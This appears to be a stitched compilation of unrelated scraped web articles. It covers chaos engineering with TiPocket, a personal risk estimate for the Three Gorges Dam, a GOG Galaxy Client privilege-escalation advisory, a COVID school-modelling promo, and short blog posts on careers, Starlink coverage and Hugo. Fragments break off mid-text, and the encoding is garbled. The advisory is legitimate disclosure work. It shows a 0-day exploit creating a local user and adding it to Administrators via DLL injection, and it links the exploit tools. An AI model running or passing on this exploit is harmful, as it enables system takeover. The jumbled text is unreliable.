failure injections in the flow.</p><p>Besides <a href="https://github.com/pingcap/tipocket/tree/master/argo/workflow" target="_blank" rel="noopener noreferrer">TiPocket’s</a> sample workflows and templates, the design also allows you to add your own failure injection flows. Handling complicated logics using codable workflows makes Argo developer-friendly and an ideal choice for our scenarios.</p><p>Now, our chaos experiment is running automatically. But if our results do not meet our expectations? How do we locate the problem? TiDB saves a variety of monitoring information, which makes log collecting essential for enabling observability in TiPocket.</p><h2>Visualizing the results: Loki</h2><p>In cloud-native systems, observability is very important. Generally speaking, you can achieve observability through <strong>metrics</strong>, <strong>logging</strong>, and <strong>tracing</strong>. TiPocket’s main test cases evaluate TiDB clusters, so metrics and logs are our default sources for locating issues.</p><p>On Kubernetes, Prometheus is the de-facto standard for metrics. However, there is no common way for log collection. Solutions such as <a href="https://en.wikipedia.org/wiki/Elasticsearch" target="_blank" rel="noopener noreferrer">Elasticsearch</a>, <a href="https://fluentbit.io/" target="_blank" rel="noopener noreferrer">Fluent Bit</a>, and <a href="https://www.elastic.co/kibana" target="_blank" rel="noopener noreferrer">Kibana</a> perform well, but they may cause system resource contention and high maintenance costs. We decided to use <a href="https://github.com/grafana/loki" target="_blank" rel="noopener noreferrer">Loki</a>, the Prometheus-like log aggregation system from <a href="https://grafana.com/" target="_blank" rel="noopener noreferrer">Grafana</a>.</p><p>Prometheus processes TiDB’s monitoring information. Prometheus and Loki have a similar labeling system, so we can easily combine Prometheus' monitoring indicators with the corresponding pod logs and use a similar query language. Grafana also supports the Loki dashboard, which means we can use Grafana to display monitoring indicators and logs at the same time. Grafana is the built-in monitoring component in TiDB, which Loki can reuse.</p><h2>Putting them all together - TiPocket</h2><p> Now, everything is ready. Here is a simplified diagram of TiPocket:</p><p><img src="https://chaos-mesh.org/img/tipocket-architecture.png" alt="TiPocket Architecture"></p><p>As you can see, the Argo workflow manages all chaos experiments and test cases. Generally, a complete test cycle involves the following steps:</p><ol><li>Argo creates a Cron Workflow, which defines the cluster to be tested, the faults to inject, the test case, and the duration of the task. If necessary, the Cron Workflow also lets you view case logs in real-time.</li></ol><p><img src="https://chaos-mesh.org/img/argo-workflow.png" alt="Argo Workflow"></p><ol><li>At a specified time, a separate TiPocket thread is started in the workflow, and the Cron Workflow is triggered. TiPocket sends TiDB-Operator the definition of the cluster to test. In turn, TiDB-Operator creates a target TiDB cluster. Meanwhile, Loki collects the related logs.</li><li>Chaos Mesh injects faults in the cluster.</li><li>Using the test cases mentioned above, the user validates the health of the system. Any test case failure leads to workflow failure in Argo, which triggers Alertmanager to send the result to the specified Slack channel. If the test cases complete normally, the cluster is cleared, and Argo stands by until the next test.</li></ol><p><img src="https://chaos-mesh.org/img/alert_message.png" alt="Alert in Slack"></p><p>This is the complete TiPocket workflow. .</p><h2>Join us</h2><p><a href="https://github.com/pingcap/chaos-mesh" target="_blank" rel="noopener noreferrer">Chaos Mesh</a> and <a href="https://github.com/pingcap/tipocket" target="_blank" rel="noopener noreferrer">TiPocket</a> are both in active iterations.

        <h2><a href="http://thinking.farm/research/three-gorges-dam/">To Dam or Not to Dam: Exploring the Failure Risk of the Three Gorges Dam </a></h2>
            
            <section id="single-content">
                <p><em>This research explores the risk that the Three Gorges dam will experience failure.
I believe the risk that the dam becomes structurally compromised, and requires the government to drain the reservoir to undertake repairs, is  <strong>20-25%</strong>. In the case that there is a seismic event, that likelihood would be closer to <strong>80%</strong>. I put the chance of a dam failure during this summer’s ongoing floods at <strong>5-10%</strong>, rising to <strong>30%</strong> in the case of a seismic event.</em></p>
<h2 id="introduction">Introduction</h2>
<p>Did Wuhan commit a great crime in 2019? How else to explain the cityâ€™s bad luck in 2020, beginning with the COVID-19 world pandemic and continuing with recent worries that the Three Gorges Dam (TGD), the worldâ€™s largest, might burst and flood the city? News reports about the dam have primarily been journalists repeating the opinions of various experts, with some quotes dating back to the 1990s. Predictably, this has encouraged the formation of two camps: those primed towards conspiratorial speculation that the Chinese Communist Party is lying about a looming catastrophe, and those that repeat state media lines that rumors about the dam are the work of Chinaâ€™s foreign enemies.</p>
<p>Nonetheless, I think that clear thinking about risk can help us assess the likelihood of disaster at the TGD. The dam is subject to three types of risks:</p>
<ol>
<li>structural integrity risk, which originates in the damâ€™s construction and maintenance</li>
<li>foundation risk, which reflects the geologic stability of the damâ€™s foundation</li>
<li>shock risk, which the likelihood that an external shock occurs, like an earthquake or landslide.</li>
</ol>
<p>Structural integrity risk is hard to assess, but we can obtain relatively clear information to assess foundation and shock risk, if we make use of valuable geologic data gathered by the Three Gorges Development Corporation in the 1990s. Moreover, the changing rhetoric of press releases from the Chinese government can reveal how the authorities themselves, who have live access to the state of the dam, are mitigating these risks. The governmentâ€™s behavior can then further calibrate our sense of how large and realized these risks actually are.</p>
<p>I have been unable to come by reliable information to assess the structural integrity of the dam. The major risk to the dam comes from foundation risk. As can be ascertained from geologic data, Sections 1-5 of the left powerhouse lie on top of a low-dipping joints with high connectivity, meaning that there is elevated sliding risk. The damâ€™s recent deformation on July 21 means previously calculated safety ratios are likely inflated. Moreover, changes in government rhetoric support this suspicion. In contrast to years past, the government claims that the dam was never mean to control floods and that each region should figure out their own solution.</p>
<p>In terms of shock risk, the dam is susceptible to seismic activity, instability arising from the sheer weight of the TGD reservoir, and flood waves large enough to overwhelm the damâ€™s sluice gates. As of writing (July 26), the 3rd flood wave has officially formed in the Yangtze, and a 4th might appear in short succession. Overall, I think there is a 20-25% chance that the dam is further structurally impaired, prompting the government to continue draining the reservoir as fast as possible. There is something like a 5-10% chance that multiple flood waves overwhelm the dam and raise the reservoir level. These would weaken the dam or its foundation and cause a sliding failure. Were an earthquake to happen this month, these risks would be something more like 80% and 30%.</p>
<h2 id="anatomy-of-a-dam">Anatomy of a dam</h2>
<p>There are several types of dam design: arch dams, buttress dams, embankment dams, and gravity dams.</p>
<p>Arch dams hold back the water partially through the strength of their structural shape. The Hoover Dam is an example of an arch dam. The arch is convex facing upstream, which distributes water pressure along the structure to the abutments at each end.</p>
<figure>
    <img src="http://thinking.farm/hoover-dam.jpg" width="100%"> <figcaption>
            <h4>The Hoover Dam, Arizona-Nevada border</h4>
        </figcaption>
</figure>

<p>Buttress dams consist of a face slab which angles away from the upstream, and is supported on the downstream side by buttress structures. These structures are attached to a base slab foundation. Buttress dams are built in areas with looser soil foundations.</p>
<figure>
    <img src="http://thinking.farm/daniel-johnson.jpg" width="100%"> <figcaption>
            <h4>The Daniel-Johnson Buttress Dam, Canada</h4>
        </figcaption>
</figure>

<p>Embankment dams are built up by the piling up of soil, rocks, or synthetic materials. These are usually porous on their outside but have an impervious core. Their main advantage is their low cost and flexibility, which allows them to adjust to shifts in the embankment or settlement of the foundation over time.</p>
<p>Gravity dams resist water flow through their sheer weight, which pulls them vertically down and allows them to resist the horizontal force of water pressure along their surface. This is similar to what a child does when he blocks a stream or rivulet by piling rocksâ€”they divert the water flow not through any structural design but through their weight. This is the origin of the name â€œgravity dam.â€�</p>
<p>A U.S. Department of the Interior report in 1998 explored various dam â€œeventsâ€�. These include four gravity dams in the United States and one in France<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>. All five suffered damage due to sliding, and two of them failed entirely. The remaining three required additional drainage, reinforcements, and the release of reservoir waters to keep water depths low. For example, the Morris Shepherd Dam suffered sliding because the initial loading of the reservoir changed the stability of the bedrock foundation such that the safety ratio fell below 1.0. In other words, the load that the dam could support before failing had fallen below the regular load the dam was supposed to hold.</p>
<h2 id="foundation-risk-is-sliding-risk">Foundation risk is sliding risk</h2>
<p>The most important factor in sliding events is the nature of the bedrock on which a gravity dam is built. In failures of this type, the part of the foundation on which the dam rests slides downstream. We have reliable data to study this phenomenon, though media and news commentators have not put in the work.</p>
<p>In 2003 scientists from the Chinese Academy of Sciences and the Yangtze River Scientific Research Institute received data and support from the Three Gorges Development Corporation, the Changjiang Water Resources Commission, and the Chinese Academy of Sciences to conduct a stability assessment of the damâ€™s foundation using physical and numerical modeling.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></p>
<p>The study incorporated a variety of techniques for the stability assessment, including conventional methods of geological mapping such as borehole drilling and shaft exploration, geophysical prospecting such as acoustic emission, remote sensing, seismic reflection and refraction, electromagnetic techniques, and physical-chemical analysis and micro-structural analysis. Most of these data are recorded in expensive studies commissioned in 1998 and 1999, when the dam was being built.<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup></p>
<p>They conclude that the â€œmajor factor influencing the foundation stability would come from the pre-existing discontinuities. However, among these discontinuities the faults mostly have steep dip angles, thin thickness, and well-cemented tectonite, so they would not play important roles in the foundation stability.â€�</p>
<h2 id="foundation-faults-and-joints">Foundation, faults, and joints</h2>
<p>The foundation is plagioclase granite which is homogenous and of high strength, and with various degrees of weathering, though the dam itself is on the moderately and lightly weathered parts.</p>
<p>The are 886 faults in the granite, most of which have steep angles (i.e. they go down more than sideways). 90% of these are shorter than 300 meters and narrower than 1 meter. Most of the faults are filled in with tectonite, a metamorphic type of rock.</p>
<p>The granite also has a very large number of joints. Joints are fractures where the two sides, unlike in a fault, lack visible or detectable movement relative to each other. 13% of joints have dip angles less than 30 degrees, 10% are between 30-60, and 77% are greater than 60 degrees.</p>
<p>The low-dipping joints have been studied more than the others because they dip downstream at an angle low enough to create sliding surfaces in the damâ€™s foundation. This was determined to be the greatest risk to foundation stability.</p>
<p>As we can see in the illustration below, the area of greatest risk is labeled â€œrelative developed regions of gently dipping joints,â€� which is where these low dipping joints are present in both long and short form, and in high densities. This area crosses the dam around the left powerhouse, which also overlaps with one of the large faults.</p>
<figure>
    <img src="http://thinking.farm/rock-joint-distribution.png" width="100%"> <figcaption>
            <h4>Rock joint distribution along the foundation of Three Gorges Dam (Liu et al)</h4>
        </figcaption>
</figure>

<p>Another risk factor is connectivity: the percentage of joints that could form a potential sliding path. The higher the connectivity, the higher the probability that a disturbance will link the joints into a fracture that produces a sliding event.</p>
<figure>
    <img src="http://thinking.farm/layout-of-tgd.png" width="100%"> <figcaption>
            <h4>Layout of the TGD and the numbered left powerhouse-dam sections (Liu et al)</h4>
        </figcaption>
</figure>

<p>Sections 1-5 of the left powerhouse dam are the weakest links. As can be seen below, the density of low-dipping joints is highest under Section No. 3 of the left powerhouse dam. Even more unfortunately, Section No. 3 also has the highest joint connectivityâ€”80% of the joints are in a potential sliding path!</p>

            <h4>Avg. linear density of low-dipping joints, and connectivity, for Sections No. 1-5 (Liu et al)</h4>

<p>We can appreciate the high connectivity of the joints under Section No. 3 through the geological sketches from Liu et al.</p>

        <h2><a href="https://www.positronsecurity.com/blog/2020-08-13-gog-galaxy_client-local-privilege-escalation_deuce/">GOG Galaxy Client Local Privilege Escalation Deuce</a></h2>
        
        <p>I reported <a href="https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/">a serious local privilege escalation flaw in GOG Galaxy Client</a> on April 28, 2020, but my follow-up investigation (detailed below) found the vendor’s fix to be insufficient.  By updating the proof-of-concept exploit code, it is possible to execute arbitrary commands as <em>SYSTEM</em> in GOG Galaxy Client v2.0.13 through <s>v2.0.15</s> v2.0.19 (the latest as of this writing).</p>
<p>GOG did not reply that this issue was officially fixed, although changes were silently made at some point after the v2.0.15 release to stop the provided proof-of-concept tools from working.  <s>It is suspected that only minor changes were made to frustrate exploitation; an investigation is ongoing</s> (See update below).</p>
<p>UPDATE (Aug. 13, 2020 @ 5:11PM): After an investigation, it was found that GOG simply updated the signing key used for verifying messages.  This key has been recovered, and the proof-of-concept has been updated with it.  This advisory now describes a <strong>0-day vulnerability in GOG Galaxy Client v2.0.19</strong> because GOG did not respond in good faith with a proper patch in 90 days, as per <a href="https://www.google.com/about/appsecurity/">Google’s vulnerability disclosure policy</a> (which GOG was made aware of during the initial contact; see Vendor Timeline, below).</p>
<h3>Investigation of Prior Patch</h3>
<p>The day before issuing my <a href="https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/">original advisory</a> on April 28, 2020, I ran the proof-of-concept exploits against the fixed versions (v1.2.67 and v2.0.14).  They no longer worked.  Unfortunately, because GOG never told me the issues were actually fixed on February 27, 2020, I didn’t have a chance to do an in-depth follow-up investigation before publishing the advisory.  I’ve since had the chance to look at their fix more deeply.</p>
<p>To start, I looked at the log file at <em>C:\ProgramData\GOG.com\Galaxy\logs\GalaxyClientService.log</em> to see if it reports anything when the old exploit is run.  I found this:</p>
<pre><code>2020-05-08 15:03:53.503 [Information][#1 (1)] [TID 7352][galaxy_service]: Received a message from process connected at '127.0.0.1:54963'.
2020-05-08 15:03:53.503 [Information][#1 (1)] [TID 7352][galaxy_service]: Determined sender to be 'C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.7_3.7.2032.0_x64__qbz5n2kfra8p0\python.exe' (PID: 8448)
2020-05-08 15:03:53.503 [Warning][#1 (1)] [TID 7352][galaxy_service]: The sender was not recognized as a trusted client.
2020-05-08 15:03:53.503 [Error][#1 (1)] [TID 7352][galaxy_service]: Received a forbidden request from an untrusted sender. Disconnecting.
</code></pre>
<p>That’s a big hint!  It looks like the privileged process, <em>GalaxyClientService.exe</em>, matches the network client’s source TCP port number with the executable process that opened the socket.  That’s how it figures out that the request is coming from the Python interpreter instead of the legitimate client (GalaxyClient.exe).</p>
<p>I immediately thought that this check can be circumvented with <a href="https://en.wikipedia.org/wiki/DLL_injection">DLL injection</a>.</p>
<h3>Updating the Proof-of-Concept</h3>
<p><em>Cue hours of re-implementing my Python proof-of-concept in C…</em></p>
<p>Ok, now I have a DLL that can be injected into <em>GalaxyClient.exe</em> which will issue the same HMAC-512-signed request as before.  Let’s test it out:</p>
<pre><code>C:\Users\user1\Desktop&gt;galaxy_dll_inject_privesc.exe --key2 C:\Windows\System32\net.exe "user jtesta Abc*123Lol /add" "C:\\"
Starting GalaxyClientService...
Executing C:\Program Files (x86)\GOG Galaxy\GalaxyClient.exe...
PID of new GalaxyClient.exe process: 10296
Injecting DLL...
DLL injected.  Waiting up to 30 seconds for pipe server to start...
Connected to pipe server.  Sending command, args, and working directory...
Sent.  Waiting for response...

Success!
</code></pre>
<p>Looks like it worked!  Ok, now let’s add this new user to the local <em>Administrators</em> group:</p>
<pre><code>C:\Users\user1\Desktop&gt;galaxy_dll_inject_privesc.exe --key2 C:\Windows\System32\net.exe "localgroup Administrators jtesta /add" "C:\\"
Starting GalaxyClientService...
Executing C:\Program Files (x86)\GOG Galaxy\GalaxyClient.exe...
PID of new GalaxyClient.exe process: 8112
Injecting DLL...
DLL injected.  Waiting up to 30 seconds for pipe server to start...
Connected to pipe server.  Sending command, args, and working directory...
Sent.  Waiting for response...

Success!
</code></pre>
<p>Let’s verify that this user exists and is part of the <em>Administrators</em> group:</p>
<pre><code>C:\Users\user1\Desktop&gt;net user jtesta
User name                    jtesta
[...]
Local Group Memberships      *Administrators       *Users
[...]
The command completed successfully.
</code></pre>
<p><strong>SUCCESS!</strong></p>
<h3>Proof-Of-Concept Exploit Tools</h3>
<p>Pre-compiled binaries and source code for the updated proof-of-concept tools (which work on GOG Galaxy v2.0.13 through v2.0.19) are available here: <a href="https://www.positronsecurity.com/blog/gog_galaxy_updated_poc_v2.zip">gog_galaxy_updated_poc_v2.zip</a> (<a href="https://www.positronsecurity.com/blog/gog_galaxy_updated_poc_v2.zip.sig">gog_galaxy_updated_poc_v2.zip.sig</a>)</p>
<p>GPG Key: <a href="https://www.positronsecurity.com/company/jtesta.asc">jtesta.asc</a> (9C61 F6A9 A3E9 BCA0 04A6  3C66 E44F 5FD3 B799 916A)</p>
<h3>Vendor Contact Timeline</h3>
<p><strong>May 12, 2020</strong>: Contact with GOG.com Support was made using the same ticket (#535258) as the <a href="https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/">original advisory</a>.</p>
<p><strong>June 4, 2020</strong>: GOG.com Support replied with:</p>
<p>“I was informed that our Developers are working on fixing the issue, but executing the attack requires the machine to be already compromised.”</p>
<p>Because this sounded like GOG was not taking the issue seriously, I responded with:</p>
<p>“It is indeed true that an attacker must have low-privilege access to the machine already.  But the problem is that this can be escalated into Administrator rights by abusing the GalaxyClientService software.  […]  Local privilege escalation (LPE) is a serious vulnerability.  GOG customers may install software/games from other untrusted sources without Administrator rights, which normally would protect them from full system compromise.  Unfortunately, due to the vulnerabilities I’ve discovered in GalaxyClientService, <em>all</em> user accounts are effectively administrators.”</p>
<p><strong>August 13, 2020</strong>: No response received from vendor after 90 days, as per <a href="https://www.google.com/about/appsecurity/">Google’s vulnerability disclosure policy</a> (which GOG was informed of).  GOG did not reply with any fix information.</p>
<p>UPDATE (Aug. 13, 2020 @ 5:11PM): <em>After</em> this advisory was publicly released, GOG.com Support responded with:</p>
<p>“Our Developers reevaluated the reported issue and think that it will take them around 3 months to create a solution, because it demands a major design change.  Would it be possible to postpone the public release of your findings by 3 months so they have time to implement and test this solution?”</p>
<p>Because this was received after the advisory was already published, the request was deemed moot.</p>
<h3>Explanation of 0-Day Exploit Release</h3>
<p>(Section added on Aug. 13, 2020 @ 5:11PM)</p>
<p>As of the time of original publication (the morning of August 13), the proof-of-concept tool released worked on v2.0.13 - v2.0.15 only; it did not work on the latest version (v2.0.19) for unknown reasons.  Hours later, an investigation revealed that GOG silently updated the message-signing key some time between the release of v2.0.16 and v2.0.19 in order to prevent the exploit from working.  This was not a good-faith attempt at addressing the security vulnerability for two reasons:</p>
<p>1.) As <a href="https://www.positronsecurity.com/blog/2020-04-28-gog-galaxy-client-local-privilege-escalation/">my first GOG Galaxy Client advisory clearly showed</a>, secret keys cannot be used to verify messages, since an attacker can easily extract those keys.  GOG already knew since January that this would not solve the core design problem.</p>
<p>2.) In private communication on May 12, I made note that I strongly suspected this would require an extensive re-design, and that I would be happy to help (for free) to ensure that a proper &amp; comprehensive fix would be shipped to end users.  No response regarding this offer was received (in fact, no response was received at all until the deadline had passed).</p>
<p>Because it reasonably seems that GOG is no longer acting in good-faith regarding this matter, I’ve updated the proof-of-concept again with the new signing key.  Hence, as of August 13, <strong>this is a 0-day vulnerability affecting GOG Galaxy Client v2.0.19</strong>.</p>

<blockquote><em>“We are living in a very challenging time as we plan for 8,000 people to return to our district (1,000 employees and 7,000 students) in seven short weeks. Data is critical to our success as we strive to balance health and safety with face-to-face interactions.” </em><br><em>-Darcie Mosley, Millcreek School District Superintendent</em></blockquote>

<div><p>COVID-19 represents an unprecedented challenge for K-12 educators and administrators who must make crucial reopening decisions under conditions of significant uncertainty. As the pandemic rages across the country, educational leaders have to consider the impact of every decision on students, teachers, parents, and the larger community they serve.</p><p>Questions school districts face include: When and how to open safely for students, teachers, and staff? What are the impacts on parents, extended families, the local economy, and the larger community? How to effectively compare and contrast different reopening policies, and which policy is best one for their particular school district? How should policies differ across elementary, middle, and high schools? What is the best way to update policies as new data become available? </p><p>These dilemmas are further complicated by the fact that epidemiological risk factors vary enormously based on local conditions, limiting the efficacy of broad, standardized policy responses, and that districts have few avenues by which to learn from each other’s experience. With so many lives and livelihoods at stake, decision makers need better tools to inform their choices.</p><p>Epistemix is working to help fill that gap.</p><p>Our team has spent decades building epidemiological models to combat infectious diseases in partnership with the National Institutes of Health, Bill and Melinda Gates Foundation, Robert Wood Johnson Foundation, and others. Now, we’re working with schools, health care systems, Fortune 500s, nonprofits, researchers, and federal, state, and local governments to respond to COVID-19.</p><p>Using data from the US Census, Department of Education, American Community Survey, and Bureau of Labor Statistics, our synthetic population matches actual local population statistics and demographics, and, unlike many equation-based models that lack the flexibility and granularity to compare the implications of actual policy interventions below the county level, our agent-based model uses realistic social dynamics to simulate epidemiological outcomes from the bottom-up to show the policy impact neighborhood by neighborhood across the country.</p><p>That specificity is crucial for districts trying to evaluate the relative merits of alternative school reopening strategies, focusing on health outcomes for students, teachers and the community. Using epidemiological best practice, we can model the specific, local consequences of different reopening policies on students, families, staff and the community—including the number of local COVID-19 cases, hospitalizations, and deaths most likely to result from each strategy. Our simulations account for every individual in a particular region as well as the households, schools, workplaces, disease progression, social-behavioral data, and regulations specific to that geography.</p><p>The researchers behind Epistemix studied student-student interactions and contact patterns in Pennsylvania schools when developing the platform by having students wear trackers and record journals of who they were in contact with and where those interactions took place during the day. This is one of the only studies of this kind and ours is the only software that accounts for this level of detail when modeling different policy outcomes. This study enables the Epistemix team to account for differences in grade level interactions throughout the school day and in the classroom.</p><p>Every model we build is designed to inform a specific choice the district is facing. We begin by calibrating our COVID-19 disease model to the specific local outbreak pattern, taking into account local closure rules, social distancing behavior, school closure orders, and other local events. In the images below, you can see how we fit our model to the actual disease history of Allegheny County in Pennsylvania—note that in the Total Cases graph on the right, because reported cases are always a fraction of actual cases, our model is likely to be more accurate than the county’s figures.</p></div>

<div><p>Once the initial model is calibrated to local conditions, we run scenarios for the particular reopening strategies the district is considering, for example: opening schools as normal, moving everything online, or reducing time spent in school by 50% by breaking students into cohorts. The model then maps out the implications of these strategies under community conditions like the stage of the epidemic and the number of cases in the county, broad social distancing measures like stay at home orders and masks, and macro-dynamics revealed by population density and mobility scores. The model then generates the number of cases, hospitalizations, deaths, and healthcare resources resulting from each strategy under consideration.</p><p>In the charts below, you can see the implications if all the Allegheny County school districts reduced physical attendance by 50%—how many students and teachers would be infected in school and how many infections would lead to hospitalized cases under three levels of community conditions.</p></div>

<div><p>These outputs arm superintendents with the analytics they need to implement the right policies for their districts. At its best, modeling isn’t about prediction, but insight. It makes assumptions explicit, provides shared context for discussion, and informs high-stakes decisions. It reveals counterintuitive ways in which COVID-19 interacts with the complex adaptive systems that are our schools and communities, and the steps we can take to make things better. <a href="https://f.hubspotusercontent10.net/hubfs/5670167/Epistemix__Schools_Report_Example.pdf" rel=" noopener">For more details, download a complete sample report here.</a></p><p>This data-driven approach to evaluating reopening strategies helps districts safeguard students, teachers, staff, families, and communities. In addition to modeling individual policy interventions, Epistemix is coordinating across districts to establish a network of superintendents and school leaders that can share best-practice in real-time as we continue to learn and adapt to the pandemic—tracking the efficacy of different approaches across similar districts.</p><p>So, how can we help <em>your</em> district? </p><p>For K-12 schools, Epistemix can model the impacts of different reopening policy options and provide grade-by-grade results for school district teams based on the district’s geography, number of students, population density, and reported cases in the county. For Epistemix to build and run a model for your district and community, district leaders will need to provide basic information including opening plans and contingencies, location of each school, number of students per grade per school, number of teachers and staff, and age ranges of teachers and staff (age is a major COVID-19 risk factor).&nbsp;Epistemix has been working with PA schools, hospital systems, and the state government on modeling various social distancing policies, business reopenings, social gatherings (e.g. high school football to Pittsburgh Pirates baseball games), and interactions between COVID-19 and other diseases like measles, flu, and pertussis.</p></div>

<h2>When not to program</h2>

<p>I was chatting with a friend, and the topic of making it in the software development industry came up. They were concerned that programming is so hard to break into and takes a long time, so they asked for a backup plan thatâ€™s in high demand but doesnâ€™t involve coding and isnâ€™t over-saturated like development. This perturbation led me to question their motives for getting into software in the first place. Iâ€™ll walk you through the most common wrong reasons to enter into this field, along with how to evaluate alternative options.</p>
<h2 id="everyones-doing-it">everyoneâ€™s doing it</h2>
<p>Following the herd only leads to stampedes. The sentiment of this market as saturated is dangerous to the degree that itâ€™s both accurate and inaccurate. Demand for these positions seems to grow without limit, suggesting that we have yet to hit a saturation point. At the same time, thereâ€™s been a torrential flood of new programmer supply from coding bootcamps, online tutorials, and remote workers the world over. The mismatch here is that most of the supply of new developers is at a junior skill level, but the bar for in-demand skills keeps rising higher toward the senior level.</p>
<h2 id="easy-peasy">easy peasy</h2>
<p>Another misconception stems from the belief that because developers perform their work on computers that it must be easy to do. After all, the rest of the world is mostly using these devices to watch cat videos, surf the rabbit hole of search results for a given topic, play games, and check their email. The only tricky part that those outside the industry tend to identify is the amount of typing performed, which seems trivial for anyone in a field involving large amounts of writing. The actual difficulty for programmers lies in the creative parts of the work that occur inside the developerâ€™s mind, and thus, are unseen. With few exceptions, most software engineering involves building new or modifying existing things to perform tasks they have never done before. There may be a software design in place, but itâ€™s more of a vague notion and less of a blueprint.</p>
<p>A successful developer will need to keep adapting their design when continuously thrown curveballs upon discovering new unknowns or changing requirements. Excellent developers will understand the business problems they are solving, and make decisions aligned with what will give their software the best chance for success. Truly superb developers also have top-notch communication skills to ensure their work fits seamlessly with the greater whole and are proactive about helping teammates who are stuck. This unique combination of creative and technical abilities is scarce and not easy to acquire.</p>
<h2 id="money">money</h2>
<p>Itâ€™s no secret that software is among the top paid careers, right after the medical professions. Combine high pay with far more affordable education options from bootcamps to free learning materials, and the choice appears to be a win-win. Beware of those offering income share agreements or high-interest loans to fund this form of learning. Even if you utilize entirely free information, thereâ€™s still the opportunity cost of what you could be doing with all the time you spent educating yourself. Just because thereâ€™s good money to be made doesnâ€™t make you any more qualified to make it. Become a developer if youâ€™re incredibly motivated or already possess the skills mentioned above to advance quickly beyond a junior skill level, but please donâ€™t do it for the money or just because other people are doing it.</p>
<h2 id="alternatives">alternatives</h2>
<p>Writing software isnâ€™t for everyone, but using software is what gives you leverage to automate your work and grow beyond what you can accomplish alone. If you write that software, youâ€™re trading your time for the full amount of that leverage. If you buy the software, youâ€™re paying for a portion of it. As long as your productivity improvement exceeds that softwareâ€™s cost, youâ€™re getting a good deal. More and more companies find themselves in the business of automation through software to survive in todayâ€™s economy. You may bypass the need for some software skills, but donâ€™t expect to escape them all.</p>
<p>There are many in-demand fields, so itâ€™s easier to start searching for alternatives from what youâ€™re already good at and love doing and then find which of those pay well. This trifecta of factors commonly is referenced as the best combination for making a successful career.</p>
<p><img src="https://words.okwolf.com/images/career-venn-diagram.png" alt=""></p>
<p>If you have yet to master anything that pays well, then your path is less certain. Some will start from what pays well and work backward, however that has a high likelihood of falling into the <a href="#money">money trap</a> of software development. Others will begin with what they love, but beware, not all passions make good careers. The best approach is from where you already have the most talent, even if youâ€™re struggling with applying it in ways that you enjoy and pay the bills.</p>
<p>Thereâ€™s no magic wand that instantly transports you to the intersection of this Venn diagram in the center. Many times honing your craft wonâ€™t be fun until you reach a certain level of proficiency. In these cases, thereâ€™s no substitute for trusting the process and persevering through your doubts. Even if you donâ€™t find success along the first course you set, you will learn about yourself along the journey. If you pay attention to the lessons life offers you, you will continue to make progress, the most any of us can hope for.</p>
<h2 id="program-your-mind-correctly-and-you-will-decode-the-world-of-work">Program your mind correctly, and you will decode the world of work.</h2>

August 14, 2020 | https://sebsebmc.github.io/starlink-coverage/index.html | <a href="https://web.archive.org/web/*/https://sebsebmc.github.io/starlink-coverage/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    
    <p>
        I am now providing two different data sets: one that is calculated witha 25 degree minimum user terminal angle
        and one with a 35 degree minimum user terminal angle. The more recent SpaceX filings show that they are capable
        of using the 25 degree minimum but that they eventually want to increase that. The previous datasets were
        calculated with a 35 degree minimum as that was what I had found on file at the time. With the lower minimum
        angle and about 100 more satellites at operational altitudes the 25 degree dataset now shows bands with
        continuous coverage.
    </p>
    <p>
        Furthermore, I plan to calculate what I call the <em>satellite multiplicity</em>, the number of satellites
        overhead at any given time on average, since the number of overlapping satellites is relevant to some
        calculations for routing and bandwith.
    </p>
    <p>
        New Features: You can now double-click a cell to toggle showing more granular data.
        Cells with 100% uptime now display a gold star. Faster parsing, reduced battery drain,
        hopefully.
    </p>
    <p><label for="minAngleSelect">Choose a minimum angle to load the dataset:</label>
        
    </p>
    
    
    <div>
        <p>This renders the percentage of the day that a portion of the earth is covered by a Starlink satellite. (Red
            is no
            coverage, blue is all day coverage).</p>
        <p>Click on a cell to see how many minutes in a day a cell is covered by at least one satellite. Note that
            currently
            for performance reasons the cells are much larger than the resolution the data was simulated at. As such the
            error within a cell can be quite large, especially near the poles where the coverage drops off rapidly.
        </p>
        <p>In my opinion anything less than 1440 minutes (aka continuous coverage) means that SpaceX <em>should not</em>
            provide service in that area.</p><p>
        For more info about how it's calculated:
        <a href="https://github.com/sebsebmc/starlink-coverage">https://github.com/sebsebmc/starlink-coverage</a></p><h2> Changelog:</h2>
        <ul>
            <li>6-20-20 - Removed satellites that had low altitudes because they are not believed to be in operational
                orbits.</li>
            <li>6-21-20 - Fixed remaining issues with calculations at the antimerdian.</li>

  <span>
H</span>
  ello and welcome to my website! Given all of this extra time I have had at home recently, I figured it was finally time to stand up a website to publish some blog posts I have been meaning to write. As any self respecting software engineer would do in this case, my plan was to build it all myself.


</p>

<p>Having not considered the ecosystem of static content generation sites for quite some time, I hit the books to figure what my options are.</p>
<h2 id="wait-its-all-javascript">Wait, it’s all JavaScript?!</h2>
<p>The very first first thing I noticed was that almost every solution required JavaScript, either at build time or on the client. JavaScript has no business being involved in static text based context, HTML and CSS already do an amazing job.</p>
<p>At the end of the day, there was only a single viable solution that passed the test of being relevant and not using JavaScript, <a href="https://gohugo.io/">Hugo</a>.</p>
<h2 id="styling">Styling</h2>
<p>Hugo at its core is really nothing more than a very feature rich HTML template renderer, which is exactly the right tool for the job of generating markup, but what about styling?</p>
<p>I chose to just use <a href="https://sass-lang.com/">SASS</a>. Using nothing but SASS is amazing for a project this small. I wrote all of the styling myself, which for text based content, really isn’t that bad.</p>
<p>Hugo offers a library of themes, but I personally find the usage of themes to be a bit tacky. I wanted something that is uniquely mine, and more importantly, doesn’t add a bunch of shit I will never use.</p>
<h2 id="hosting--deployment">Hosting &amp; deployment</h2>
<p>Hosting static content in 2020 is so easy it should be <em>illegal</em>. I use <a href="https://pages.github.com/">GitHub Pages</a> as the host, which really is as simple as turning it on in the repository settings.</p>
<p>Similarly, deployment is disgustingly easy with <a href="https://github.com/features/actions">GitHub Actions</a>. My configuration file is triggered by every push to master, which then:</p>
<ol>
<li>Downloads the <code>hugo</code> binary</li>
<li>Builds the site from source with <code>hugo</code></li>
<li>Pushes the build to the <code>gh-pages</code> branch</li>
</ol>
